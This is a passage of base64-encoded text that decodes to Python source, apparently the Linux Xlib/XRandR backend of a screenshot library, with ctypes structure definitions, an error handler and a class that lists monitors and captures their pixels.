CAgICAoInNhdmVfdW5kZXIiLCBjX2ludDMyKSxcbiAgICAgICAgKCJjb2xvdXJtYXAiLCBjX3Vsb25nKSxcbiAgICAgICAgKCJtYXBpbnN0YWxsZWQiLCBjX3VpbnQzMiksXG4gICAgICAgICgibWFwX3N0YXRlIiwgY191aW50MzIpLFxuICAgICAgICAoImFsbF9ldmVudF9tYXNrcyIsIGNfdWxvbmcpLFxuICAgICAgICAoInlvdXJfZXZlbnRfbWFzayIsIGNfdWxvbmcpLFxuICAgICAgICAoImRvX25vdF9wcm9wYWdhdGVfbWFzayIsIGNfdWxvbmcpLFxuICAgICAgICAoIm92ZXJyaWRlX3JlZGlyZWN0IiwgY19pbnQzMiksXG4gICAgICAgICgic2NyZWVuIiwgY191bG9uZyksXG4gICAgXVxuXG5cbmNsYXNzIFhJbWFnZShTdHJ1Y3R1cmUpOlxuICAgICIiIlxuICAgIERlc2NyaXB0aW9uIG9mIGFuIGltYWdlIGFzIGl0IGV4aXN0cyBpbiB0aGUgY2xpZW50XCdzIG1lbW9yeS5cbiAgICBodHRwczovL3Ryb25jaGUuY29tL2d1aS94L3hsaWIvZ3JhcGhpY3MvaW1hZ2VzLmh0bWxcbiAgICAiIiJcblxuICAgIF9maWVsZHNfID0gW1xuICAgICAgICAoIndpZHRoIiwgY19pbnQpLFxuICAgICAgICAoImhlaWdodCIsIGNfaW50KSxcbiAgICAgICAgKCJ4b2Zmc2V0IiwgY19pbnQpLFxuICAgICAgICAoImZvcm1hdCIsIGNfaW50KSxcbiAgICAgICAgKCJkYXRhIiwgY192b2lkX3ApLFxuICAgICAgICAoImJ5dGVfb3JkZXIiLCBjX2ludCksXG4gICAgICAgICgiYml0bWFwX3VuaXQiLCBjX2ludCksXG4gICAgICAgICgiYml0bWFwX2JpdF9vcmRlciIsIGNfaW50KSxcbiAgICAgICAgKCJiaXRtYXBfcGFkIiwgY19pbnQpLFxuICAgICAgICAoImRlcHRoIiwgY19pbnQpLFxuICAgICAgICAoImJ5dGVzX3Blcl9saW5lIiwgY19pbnQpLFxuICAgICAgICAoImJpdHNfcGVyX3BpeGVsIiwgY19pbnQpLFxuICAgICAgICAoInJlZF9tYXNrIiwgY191bG9uZyksXG4gICAgICAgICgiZ3JlZW5fbWFzayIsIGNfdWxvbmcpLFxuICAgICAgICAoImJsdWVfbWFzayIsIGNfdWxvbmcpLFxuICAgIF1cblxuXG5jbGFzcyBYUlJNb2RlSW5mbyhTdHJ1Y3R1cmUpOlxuICAgICIiIiBWb2lsXHhjM1x4YTAsIHZvaWxceGMzXHhhMC4gIiIiXG5cblxuY2xhc3MgWFJSU2NyZWVuUmVzb3VyY2VzKFN0cnVjdHVyZSk6XG4gICAgIiIiXG4gICAgU3RydWN0dXJlIHRoYXQgY29udGFpbnMgYXJyYXlzIG9mIFhJRHMgdGhhdCBwb2ludCB0byB0aGVcbiAgICBhdmFpbGFibGUgb3V0cHV0cyBhbmQgYXNzb2NpYXRlZCBDUlRDcy5cbiAgICAiIiJcblxuICAgIF9maWVsZHNfID0gW1xuICAgICAgICAoInRpbWVzdGFtcCIsIGNfdWxvbmcpLFxuICAgICAgICAoImNvbmZpZ1RpbWVzdGFtcCIsIGNfdWxvbmcpLFxuICAgICAgICAoIm5jcnRjIiwgY19pbnQpLFxuICAgICAgICAoImNydGNzIiwgUE9JTlRFUihjX2xvbmcpKSxcbiAgICAgICAgKCJub3V0cHV0IiwgY19pbnQpLFxuICAgICAgICAoIm91dHB1dHMiLCBQT0lOVEVSKGNfbG9uZykpLFxuICAgICAgICAoIm5tb2RlIiwgY19pbnQpLFxuICAgICAgICAoIm1vZGVzIiwgUE9JTlRFUihYUlJNb2RlSW5mbykpLFxuICAgIF1cblxuXG5jbGFzcyBYUlJDcnRjSW5mbyhTdHJ1Y3R1cmUpOlxuICAgICIiIiBTdHJ1Y3R1cmUgdGhhdCBjb250YWlucyBDUlRDIGluZm9ybWF0aW9uLiAiIiJcblxuICAgIF9maWVsZHNfID0gW1xuICAgICAgICAoInRpbWVzdGFtcCIsIGNfdWxvbmcpLFxuICAgICAgICAoIngiLCBjX2ludCksXG4gICAgICAgICgieSIsIGNfaW50KSxcbiAgICAgICAgKCJ3aWR0aCIsIGNfaW50KSxcbiAgICAgICAgKCJoZWlnaHQiLCBjX2ludCksXG4gICAgICAgICgibW9kZSIsIGNfbG9uZyksXG4gICAgICAgICgicm90YXRpb24iLCBjX2ludCksXG4gICAgICAgICgibm91dHB1dCIsIGNfaW50KSxcbiAgICAgICAgKCJvdXRwdXRzIiwgUE9JTlRFUihjX2xvbmcpKSxcbiAgICAgICAgKCJyb3RhdGlvbnMiLCBjX3VzaG9ydCksXG4gICAgICAgICgibnBvc3NpYmxlIiwgY19pbnQpLFxuICAgICAgICAoInBvc3NpYmxlIiwgUE9JTlRFUihjX2xvbmcpKSxcbiAgICBdXG5cblxuQENGVU5DVFlQRShjX2ludCwgUE9JTlRFUihEaXNwbGF5KSwgUE9JTlRFUihFdmVudCkpXG5kZWYgZXJyb3JfaGFuZGxlcihfLCBldmVudCk6XG4gICAgIyB0eXBlOiAoQW55LCBBbnkpIC0+IGludFxuICAgICIiIiBTcGVjaWZpZXMgdGhlIHByb2dyYW1cJ3Mgc3VwcGxpZWQgZXJyb3IgaGFuZGxlci4gIiIiXG5cbiAgICBldnQgPSBldmVudC5jb250ZW50c1xuICAgIEVSUk9SLmRldGFpbHMgPSB7XG4gICAgICAgICJ0eXBlIjogZXZ0LnR5cGUsXG4gICAgICAgICJzZXJpYWwiOiBldnQuc2VyaWFsLFxuICAgICAgICAiZXJyb3JfY29kZSI6IGV2dC5lcnJvcl9jb2RlLFxuICAgICAgICAicmVxdWVzdF9jb2RlIjogZXZ0LnJlcXVlc3RfY29kZSxcbiAgICAgICAgIm1pbm9yX2NvZGUiOiBldnQubWlub3JfY29kZSxcbiAgICB9XG4gICAgcmV0dXJuIDBcblxuXG5kZWYgdmFsaWRhdGUocmV0dmFsLCBmdW5jLCBhcmdzKTpcbiAgICAjIHR5cGU6IChpbnQsIEFueSwgVHVwbGVbQW55LCBBbnldKSAtPiBPcHRpb25hbFtUdXBsZVtBbnksIEFueV1dXG4gICAgIiIiIFZhbGlkYXRlIHRoZSByZXR1cm5lZCB2YWx1ZSBvZiBhIFhsaWIgb3IgWFJBTkRSIGZ1bmN0aW9uLiAiIiJcblxuICAgIGlmIHJldHZhbCAhPSAwIGFuZCBub3QgRVJST1IuZGV0YWlsczpcbiAgICAgICAgcmV0dXJuIGFyZ3NcblxuICAgIGVyciA9ICJ7fSgpIGZhaWxlZCIuZm9ybWF0KGZ1bmMuX19uYW1lX18pXG4gICAgZGV0YWlscyA9IHsicmV0dmFsIjogcmV0dmFsLCAiYXJncyI6IGFyZ3N9XG4gICAgcmFpc2UgU2NyZWVuU2hvdEVycm9yKGVyciwgZGV0YWlscz1kZXRhaWxzKVxuXG5cbiMgQyBmdW5jdGlvbnMgdGhhdCB3aWxsIGJlIGluaXRpYWxpc2VkIGxhdGVyLlxuIyBTZWUgaHR0cHM6Ly90cm9uY2hlLmNvbS9ndWkveC94bGliL2Z1bmN0aW9uLWluZGV4Lmh0bWwgZm9yIGRldGFpbHMuXG4jXG4jIFRoaXMgaXMgYSBkaWN0OlxuIyAgICBjZnVuY3Rpb246IChhdHRyLCBhcmd0eXBlcywgcmVzdHlwZSlcbiNcbiMgQXZhaWxhYmxlIGF0dHI6IHhsaWIsIHhyYW5kci5cbiNcbiMgTm90ZToga2VlcCBpdCBzb3J0ZWQgYnkgY2Z1bmN0aW9uLlxuQ0ZVTkNUSU9OUyA9IHtcbiAgICAiWERlZmF1bHRSb290V2luZG93IjogKCJ4bGliIiwgW1BPSU5URVIoRGlzcGxheSldLCBQT0lOVEVSKFhXaW5kb3dBdHRyaWJ1dGVzKSksXG4gICAgIlhEZXN0cm95SW1hZ2UiOiAoInhsaWIiLCBbUE9JTlRFUihYSW1hZ2UpXSwgY192b2lkX3ApLFxuICAgICJYR2V0RXJyb3JUZXh0IjogKCJ4bGliIiwgW1BPSU5URVIoRGlzcGxheSksIGNfaW50LCBjX2NoYXJfcCwgY19pbnRdLCBjX3ZvaWRfcCksXG4gICAgIlhHZXRJbWFnZSI6IChcbiAgICAgICAgInhsaWIiLFxuICAgICAgICBbXG4gICAgICAgICAgICBQT0lOVEVSKERpc3BsYXkpLFxuICAgICAgICAgICAgUE9JTlRFUihEaXNwbGF5KSxcbiAgICAgICAgICAgIGNfaW50LFxuICAgICAgICAgICAgY19pbnQsXG4gICAgICAgICAgICBjX3VpbnQsXG4gICAgICAgICAgICBjX3VpbnQsXG4gICAgICAgICAgICBjX3Vsb25nLFxuICAgICAgICAgICAgY19pbnQsXG4gICAgICAgIF0sXG4gICAgICAgIFBPSU5URVIoWEltYWdlKSxcbiAgICApLFxuICAgICJYR2V0V2luZG93QXR0cmlidXRlcyI6IChcbiAgICAgICAgInhsaWIiLFxuICAgICAgICBbUE9JTlRFUihEaXNwbGF5KSwgUE9JTlRFUihYV2luZG93QXR0cmlidXRlcyksIFBPSU5URVIoWFdpbmRvd0F0dHJpYnV0ZXMpXSxcbiAgICAgICAgY19pbnQsXG4gICAgKSxcbiAgICAiWE9wZW5EaXNwbGF5IjogKCJ4bGliIiwgW2NfY2hhcl9wXSwgUE9JTlRFUihEaXNwbGF5KSksXG4gICAgIlhRdWVyeUV4dGVuc2lvbiI6IChcbiAgICAgICAgInhsaWIiLFxuICAgICAgICBbXG4gICAgICAgICAgICBQT0lOVEVSKERpc3BsYXkpLFxuICAgICAgICAgICAgY19jaGFyX3AsXG4gICAgICAgICAgICBQT0lOVEVSKGNfaW50KSxcbiAgICAgICAgICAgIFBPSU5URVIoY19pbnQpLFxuICAgICAgICAgICAgUE9JTlRFUihjX2ludCksXG4gICAgICAgIF0sXG4gICAgICAgIGNfdWludCxcbiAgICApLFxuICAgICJYUlJGcmVlQ3J0Y0luZm8iOiAoInhyYW5kciIsIFtQT0lOVEVSKFhSUkNydGNJbmZvKV0sIGNfdm9pZF9wKSxcbiAgICAiWFJSRnJlZVNjcmVlblJlc291cmNlcyI6ICgieHJhbmRyIiwgW1BPSU5URVIoWFJSU2NyZWVuUmVzb3VyY2VzKV0sIGNfdm9pZF9wKSxcbiAgICAiWFJSR2V0Q3J0Y0luZm8iOiAoXG4gICAgICAgICJ4cmFuZHIiLFxuICAgICAgICBbUE9JTlRFUihEaXNwbGF5KSwgUE9JTlRFUihYUlJTY3JlZW5SZXNvdXJjZXMpLCBjX2xvbmddLFxuICAgICAgICBQT0lOVEVSKFhSUkNydGNJbmZvKSxcbiAgICApLFxuICAgICJYUlJHZXRTY3JlZW5SZXNvdXJjZXMiOiAoXG4gICAgICAgICJ4cmFuZHIiLFxuICAgICAgICBbUE9JTlRFUihEaXNwbGF5KSwgUE9JTlRFUihEaXNwbGF5KV0sXG4gICAgICAgIFBPSU5URVIoWFJSU2NyZWVuUmVzb3VyY2VzKSxcbiAgICApLFxuICAgICJYUlJHZXRTY3JlZW5SZXNvdXJjZXNDdXJyZW50IjogKFxuICAgICAgICAieHJhbmRyIixcbiAgICAgICAgW1BPSU5URVIoRGlzcGxheSksIFBPSU5URVIoRGlzcGxheSldLFxuICAgICAgICBQT0lOVEVSKFhSUlNjcmVlblJlc291cmNlcyksXG4gICAgKSxcbiAgICAiWFNldEVycm9ySGFuZGxlciI6ICgieGxpYiIsIFtjX3ZvaWRfcF0sIGNfaW50KSxcbn1cblxuXG5jbGFzcyBNU1MoTVNTQmFzZSk6XG4gICAgIiIiXG4gICAgTXVsdGlwbGUgU2NyZWVuU2hvdHMgaW1wbGVtZW50YXRpb24gZm9yIEdOVS9MaW51eC5cbiAgICBJdCB1c2VzIGludGVuc2l2ZWx5IHRoZSBYbGliIGFuZCBpdHMgWHJhbmRyIGV4dGVuc2lvbi5cbiAgICAiIiJcblxuICAgIF9fc2xvdHNfXyA9IHsiZHJhd2FibGUiLCAicm9vdCIsICJ4bGliIiwgInhyYW5kciJ9XG5cbiAgICAjIEEgZGljdCB0byBtYWludGFpbiAqZGlzcGxheSogdmFsdWVzIGNyZWF0ZWQgYnkgbXVsdGlwbGUgdGhyZWFkcy5cbiAgICBfZGlzcGxheV9kaWN0ID0ge30gICMgdHlwZTogRGljdFt0aHJlYWRpbmcuVGhyZWFkLCBpbnRdXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgZGlzcGxheT1Ob25lKTpcbiAgICAgICAgIyB0eXBlOiAoT3B0aW9uYWxbVW5pb25bYnl0ZXMsIHN0cl1dKSAtPiBOb25lXG4gICAgICAgICIiIiBHTlUvTGludXggaW5pdGlhbGlzYXRpb25zLiAiIiJcblxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKClcblxuICAgICAgICBpZiBub3QgZGlzcGxheTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBkaXNwbGF5ID0gb3MuZW52aXJvblsiRElTUExBWSJdLmVuY29kZSgidXRmLTgiKVxuICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOlxuICAgICAgICAgICAgICAgICMgcHlsaW50OiBkaXNhYmxlPXJhaXNlLW1pc3NpbmctZnJvbVxuICAgICAgICAgICAgICAgIHJhaXNlIFNjcmVlblNob3RFcnJvcigiJERJU1BMQVkgbm90IHNldC4iKVxuXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGRpc3BsYXksIGJ5dGVzKTpcbiAgICAgICAgICAgIGRpc3BsYXkgPSBkaXNwbGF5LmVuY29kZSgidXRmLTgiKVxuXG4gICAgICAgIGlmIGIiOiIgbm90IGluIGRpc3BsYXk6XG4gICAgICAgICAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoIkJhZCBkaXNwbGF5IHZhbHVlOiB7IXJ9LiIuZm9ybWF0KGRpc3BsYXkpKVxuXG4gICAgICAgIHgxMSA9IGN0eXBlcy51dGlsLmZpbmRfbGlicmFyeSgiWDExIilcbiAgICAgICAgaWYgbm90IHgxMTpcbiAgICAgICAgICAgIHJhaXNlIFNjcmVlblNob3RFcnJvcigiTm8gWDExIGxpYnJhcnkgZm91bmQuIilcbiAgICAgICAgc2VsZi54bGliID0gY3R5cGVzLmNkbGwuTG9hZExpYnJhcnkoeDExKVxuXG4gICAgICAgICMgSW5zdGFsbCB0aGUgZXJyb3IgaGFuZGxlciB0byBwcmV2ZW50IGludGVycHJldGVyIGNyYXNoZXM6XG4gICAgICAgICMgYW55IGVycm9yIHdpbGwgcmFpc2UgYSBTY3JlZW5TaG90RXJyb3IgZXhjZXB0aW9uLlxuICAgICAgICBzZWxmLnhsaWIuWFNldEVycm9ySGFuZGxlcihlcnJvcl9oYW5kbGVyKVxuXG4gICAgICAgIHhyYW5kciA9IGN0eXBlcy51dGlsLmZpbmRfbGlicmFyeSgiWHJhbmRyIilcbiAgICAgICAgaWYgbm90IHhyYW5kcjpcbiAgICAgICAgICAgIHJhaXNlIFNjcmVlblNob3RFcnJvcigiTm8gWHJhbmRyIGV4dGVuc2lvbiBmb3VuZC4iKVxuICAgICAgICBzZWxmLnhyYW5kciA9IGN0eXBlcy5jZGxsLkxvYWRMaWJyYXJ5KHhyYW5kcilcblxuICAgICAgICBzZWxmLl9zZXRfY2Z1bmN0aW9ucygpXG5cbiAgICAgICAgc2VsZi5yb290ID0gc2VsZi54bGliLlhEZWZhdWx0Um9vdFdpbmRvdyhzZWxmLl9nZXRfZGlzcGxheShkaXNwbGF5KSlcblxuICAgICAgICBpZiBub3Qgc2VsZi5oYXNfZXh0ZW5zaW9uKCJSQU5EUiIpOlxuICAgICAgICAgICAgcmFpc2UgU2NyZWVuU2hvdEVycm9yKCJObyBYcmFuZHIgZXh0ZW5zaW9uIGZvdW5kLiIpXG5cbiAgICAgICAgIyBGaXggZm9yIFhSUkdldFNjcmVlblJlc291cmNlcyBhbmQgWEdldEltYWdlOlxuICAgICAgICAjICAgICBleHBlY3RlZCBMUF9EaXNwbGF5IGluc3RhbmNlIGluc3RlYWQgb2YgTFBfWFdpbmRvd0F0dHJpYnV0ZXNcbiAgICAgICAgc2VsZi5kcmF3YWJsZSA9IGN0eXBlcy5jYXN0KHNlbGYucm9vdCwgUE9JTlRFUihEaXNwbGF5KSlcblxuICAgIGRlZiBoYXNfZXh0ZW5zaW9uKHNlbGYsIGV4dGVuc2lvbik6XG4gICAgICAgICMgdHlwZTogKHN0cikgLT4gYm9vbFxuICAgICAgICAiIiJSZXR1cm4gVHJ1ZSBpZiB0aGUgZ2l2ZW4gKmV4dGVuc2lvbiogaXMgcGFydCBvZiB0aGUgZXh0ZW5zaW9ucyBsaXN0IG9mIHRoZSBzZXJ2ZXIuIiIiXG4gICAgICAgIHdpdGggbG9jazpcbiAgICAgICAgICAgIG1ham9yX29wY29kZV9yZXR1cm4gPSBjX2ludCgpXG4gICAgICAgICAgICBmaXJzdF9ldmVudF9yZXR1cm4gPSBjX2ludCgpXG4gICAgICAgICAgICBmaXJzdF9lcnJvcl9yZXR1cm4gPSBjX2ludCgpXG5cbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBzZWxmLnhsaWIuWFF1ZXJ5RXh0ZW5zaW9uKFxuICAgICAgICAgICAgICAgICAgICBzZWxmLl9nZXRfZGlzcGxheSgpLFxuICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uZW5jb2RlKCJsYXRpbjEiKSxcbiAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKG1ham9yX29wY29kZV9yZXR1cm4pLFxuICAgICAgICAgICAgICAgICAgICBjdHlwZXMuYnlyZWYoZmlyc3RfZXZlbnRfcmV0dXJuKSxcbiAgICAgICAgICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKGZpcnN0X2Vycm9yX3JldHVybiksXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgZXhjZXB0IFNjcmVlblNob3RFcnJvcjpcbiAgICAgICAgICAgICAgICByZXR1cm4gRmFsc2VcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcblxuICAgIGRlZiBfZ2V0X2Rpc3BsYXkoc2VsZiwgZGlzcD1Ob25lKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFJldHJpZXZlIGEgdGhyZWFkLXNhZmUgZGlzcGxheSBmcm9tIFhPcGVuRGlzcGxheSgpLlxuICAgICAgICBJbiBtdWx0aXRocmVhZGluZywgaWYgdGhlIHRocmVhZCB3aG8gY3JlYXRlcyAqZGlzcGxheSogaXMgZGVhZCwgKmRpc3BsYXkqIHdpbGxcbiAgICAgICAgbm8gbG9uZ2VyIGJlIHZhbGlkIHRvIGdyYWIgdGhlIHNjcmVlbi4gVGhlICpkaXNwbGF5KiBhdHRyaWJ1dGUgaXMgcmVwbGFjZWRcbiAgICAgICAgd2l0aCAqX2Rpc3BsYXlfZGljdCogdG8gbWFpbnRhaW4gdGhlICpkaXNwbGF5KiB2YWx1ZXMgaW4gbXVsdGl0aHJlYWRpbmcuXG4gICAgICAgIFNpbmNlIHRoZSBjdXJyZW50IHRocmVhZCBhbmQgbWFpbiB0aHJlYWQgYXJlIGFsd2F5cyBhbGl2ZSwgcmV1c2UgdGhlaXJcbiAgICAgICAgKmRpc3BsYXkqIHZhbHVlIGZpcnN0LlxuICAgICAgICAiIiJcbiAgICAgICAgY3VyX3RocmVhZCwgbWFpbl90aHJlYWQgPSB0aHJlYWRpbmcuY3VycmVudF90aHJlYWQoKSwgdGhyZWFkaW5nLm1haW5fdGhyZWFkKClcbiAgICAgICAgZGlzcGxheSA9IE1TUy5fZGlzcGxheV9kaWN0LmdldChjdXJfdGhyZWFkKSBvciBNU1MuX2Rpc3BsYXlfZGljdC5nZXQoXG4gICAgICAgICAgICBtYWluX3RocmVhZFxuICAgICAgICApXG4gICAgICAgIGlmIG5vdCBkaXNwbGF5OlxuICAgICAgICAgICAgZGlzcGxheSA9IE1TUy5fZGlzcGxheV9kaWN0W2N1cl90aHJlYWRdID0gc2VsZi54bGliLlhPcGVuRGlzcGxheShkaXNwKVxuICAgICAgICByZXR1cm4gZGlzcGxheVxuXG4gICAgZGVmIF9zZXRfY2Z1bmN0aW9ucyhzZWxmKTpcbiAgICAgICAgIiIiIFNldCBhbGwgY3R5cGVzIGZ1bmN0aW9ucyBhbmQgYXR0YWNoIHRoZW0gdG8gYXR0cmlidXRlcy4gIiIiXG5cbiAgICAgICAgY2ZhY3RvcnkgPSBzZWxmLl9jZmFjdG9yeVxuICAgICAgICBhdHRycyA9IHtcbiAgICAgICAgICAgICJ4bGliIjogc2VsZi54bGliLFxuICAgICAgICAgICAgInhyYW5kciI6IHNlbGYueHJhbmRyLFxuICAgICAgICB9XG4gICAgICAgIGZvciBmdW5jLCAoYXR0ciwgYXJndHlwZXMsIHJlc3R5cGUpIGluIENGVU5DVElPTlMuaXRlbXMoKTpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBjZmFjdG9yeShcbiAgICAgICAgICAgICAgICAgICAgYXR0cj1hdHRyc1thdHRyXSxcbiAgICAgICAgICAgICAgICAgICAgZXJyY2hlY2s9dmFsaWRhdGUsXG4gICAgICAgICAgICAgICAgICAgIGZ1bmM9ZnVuYyxcbiAgICAgICAgICAgICAgICAgICAgYXJndHlwZXM9YXJndHlwZXMsXG4gICAgICAgICAgICAgICAgICAgIHJlc3R5cGU9cmVzdHlwZSxcbiAgICAgICAgICAgICAgICApICAjIHR5cGU6IGlnbm9yZVxuICAgICAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgICAgIHBhc3NcblxuICAgIGRlZiBnZXRfZXJyb3JfZGV0YWlscyhzZWxmKTpcbiAgICAgICAgIyB0eXBlOiAoKSAtPiBPcHRpb25hbFtEaWN0W3N0ciwgQW55XV1cbiAgICAgICAgIiIiIEdldCBtb3JlIGluZm9ybWF0aW9uIGFib3V0IHRoZSBsYXRlc3QgWCBzZXJ2ZXIgZXJyb3IuICIiIlxuXG4gICAgICAgIGRldGFpbHMgPSB7fSAgIyB0eXBlOiBEaWN0W3N0ciwgQW55XVxuXG4gICAgICAgIGlmIEVSUk9SLmRldGFpbHM6XG4gICAgICAgICAgICBkZXRhaWxzID0geyJ4ZXJyb3JfZGV0YWlscyI6IEVSUk9SLmRldGFpbHN9XG4gICAgICAgICAgICBFUlJPUi5kZXRhaWxzID0gTm9uZVxuICAgICAgICAgICAgeHNlcnZlcl9lcnJvciA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcigxMDI0KVxuICAgICAgICAgICAgc2VsZi54bGliLlhHZXRFcnJvclRleHQoXG4gICAgICAgICAgICAgICAgc2VsZi5fZ2V0X2Rpc3BsYXkoKSxcbiAgICAgICAgICAgICAgICBkZXRhaWxzLmdldCgieGVycm9yX2RldGFpbHMiLCB7fSkuZ2V0KCJlcnJvcl9jb2RlIiwgMCksXG4gICAgICAgICAgICAgICAgeHNlcnZlcl9lcnJvcixcbiAgICAgICAgICAgICAgICBsZW4oeHNlcnZlcl9lcnJvciksXG4gICAgICAgICAgICApXG4gICAgICAgICAgICB4ZXJyb3IgPSB4c2VydmVyX2Vycm9yLnZhbHVlLmRlY29kZSgidXRmLTgiKVxuICAgICAgICAgICAgaWYgeGVycm9yICE9ICIwIjpcbiAgICAgICAgICAgICAgICBkZXRhaWxzWyJ4ZXJyb3IiXSA9IHhlcnJvclxuXG4gICAgICAgIHJldHVybiBkZXRhaWxzXG5cbiAgICBkZWYgX21vbml0b3JzX2ltcGwoc2VsZik6XG4gICAgICAgICMgdHlwZTogKCkgLT4gTm9uZVxuICAgICAgICAiIiIgR2V0IHBvc2l0aW9ucyBvZiBtb25pdG9ycy4gSXQgd2lsbCBwb3B1bGF0ZSBzZWxmLl9tb25pdG9ycy4gIiIiXG5cbiAgICAgICAgZGlzcGxheSA9IHNlbGYuX2dldF9kaXNwbGF5KClcbiAgICAgICAgaW50XyA9IGludFxuICAgICAgICB4cmFuZHIgPSBzZWxmLnhyYW5kclxuXG4gICAgICAgICMgQWxsIG1vbml0b3JzXG4gICAgICAgIGd3YSA9IFhXaW5kb3dBdHRyaWJ1dGVzKClcbiAgICAgICAgc2VsZi54bGliLlhHZXRXaW5kb3dBdHRyaWJ1dGVzKGRpc3BsYXksIHNlbGYucm9vdCwgY3R5cGVzLmJ5cmVmKGd3YSkpXG4gICAgICAgIHNlbGYuX21vbml0b3JzLmFwcGVuZChcbiAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAibGVmdCI6IGludF8oZ3dhLngpLFxuICAgICAgICAgICAgICAgICJ0b3AiOiBpbnRfKGd3YS55KSxcbiAgICAgICAgICAgICAgICAid2lkdGgiOiBpbnRfKGd3YS53aWR0aCksXG4gICAgICAgICAgICAgICAgImhlaWdodCI6IGludF8oZ3dhLmhlaWdodCksXG4gICAgICAgICAgICB9XG4gICAgICAgIClcblxuICAgICAgICAjIEVhY2ggbW9uaXRvcnNcbiAgICAgICAgIyBBIHNpbXBsZSBiZW5jaG1hcmsgY2FsbGluZyAxMCB0aW1lcyB0aG9zZSAyIGZ1bmN0aW9uczpcbiAgICAgICAgIyBYUlJHZXRTY3JlZW5SZXNvdXJjZXMoKTogICAgICAgIDAuMTc1NTk3MTQyOTk1Njg0NCBzXG4gICAgICAgICMgWFJSR2V0U2NyZWVuUmVzb3VyY2VzQ3VycmVudCgpOiAwLjAwMzkxMjU1ODAwNzg2ODkgc1xuICAgICAgICAjIFRoZSBzZWNvbmQgaXMgZmFzdGVyIGJ5IGEgZmFjdG9yIG9mIDQ0ISBTbyB0cnkgdG8gdXNlIGl0IGZpcnN0LlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBtb24gPSB4cmFuZHIuWFJSR2V0U2NyZWVuUmVzb3VyY2VzQ3VycmVudChkaXNwbGF5LCBzZWxmLmRyYXdhYmxlKS5jb250ZW50c1xuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICBtb24gPSB4cmFuZHIuWFJSR2V0U2NyZWVuUmVzb3VyY2VzKGRpc3BsYXksIHNlbGYuZHJhd2FibGUpLmNvbnRlbnRzXG5cbiAgICAgICAgY3J0Y3MgPSBtb24uY3J0Y3NcbiAgICAgICAgZm9yIGlkeCBpbiByYW5nZShtb24ubmNydGMpOlxuICAgICAgICAgICAgY3J0YyA9IHhyYW5kci5YUlJHZXRDcnRjSW5mbyhkaXNwbGF5LCBtb24sIGNydGNzW2lkeF0pLmNvbnRlbnRzXG4gICAgICAgICAgICBpZiBjcnRjLm5vdXRwdXQgPT0gMDpcbiAgICAgICAgICAgICAgICB4cmFuZHIuWFJSRnJlZUNydGNJbmZvKGNydGMpXG4gICAgICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICAgICAgc2VsZi5fbW9uaXRvcnMuYXBwZW5kKFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgImxlZnQiOiBpbnRfKGNydGMueCksXG4gICAgICAgICAgICAgICAgICAgICJ0b3AiOiBpbnRfKGNydGMueSksXG4gICAgICAgICAgICAgICAgICAgICJ3aWR0aCI6IGludF8oY3J0Yy53aWR0aCksXG4gICAgICAgICAgICAgICAgICAgICJoZWlnaHQiOiBpbnRfKGNydGMuaGVpZ2h0KSxcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICApXG4gICAgICAgICAgICB4cmFuZHIuWFJSRnJlZUNydGNJbmZvKGNydGMpXG4gICAgICAgIHhyYW5kci5YUlJGcmVlU2NyZWVuUmVzb3VyY2VzKG1vbilcblxuICAgIGRlZiBfZ3JhYl9pbXBsKHNlbGYsIG1vbml0b3IpOlxuICAgICAgICAjIHR5cGU6IChNb25pdG9yKSAtPiBTY3JlZW5TaG90XG4gICAgICAgICIiIiBSZXRyaWV2ZSBhbGwgcGl4ZWxzIGZyb20gYSBtb25pdG9yLiBQaXhlbHMgaGF2ZSB0byBiZSBSR0IuICIiIlxuXG4gICAgICAgIHhpbWFnZSA9IHNlbGYueGxpYi5YR2V0SW1hZ2UoXG4gICAgICAgICAgICBzZWxmLl9nZXRfZGlzcGxheSgpLFxuICAgICAgICAgICAgc2VsZi5kcmF3YWJsZSxcbiAgICAgICAgICAgIG1vbml0b3JbImxlZnQiXSxcbiAgICAgICAgICAgIG1vbml0b3JbInRvcCJdLFxuICAgICAgICAgICAgbW9uaXRvclsid2lkdGgiXSxcbiAgICAgICAgICAgIG1vbml0b3JbImhlaWdodCJdLFxuICAgICAgICAgICAgUExBSU5NQVNLLFxuICAgICAgICAgICAgWlBJWE1BUCxcbiAgICAgICAgKVxuXG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIGJpdHNfcGVyX3BpeGVsID0geGltYWdlLmNvbnRlbnRzLmJpdHNfcGVyX3BpeGVsXG4gICAgICAgICAgICBpZiBiaXRzX3Blcl9waXhlbCAhPSAzMjpcbiAgICAgICAgICAgICAgICByYWlzZSBTY3JlZW5TaG90RXJyb3IoXG4gICAgICAgICAgICAgICAgICAgICJbWEltYWdlXSBiaXRzIHBlciBwaXhlbCB2YWx1ZSBub3QgKHlldD8pIGltcGxlbWVudGVkOiB7fS4iLmZvcm1hdChcbiAgICAgICAgICAgICAgICAgICAgICAgIGJpdHNfcGVyX3BpeGVsXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG5cbiAgICAgICAgICAgIHJhd19kYXRhID0gY3R5cGVzLmNhc3QoXG4gICAgICAgICAgICAgICAgeGltYWdlLmNvbnRlbnRzLmRhdGEsXG4gICAgICAgICAgICAgICAgUE9JTlRFUihjX3VieXRlICogb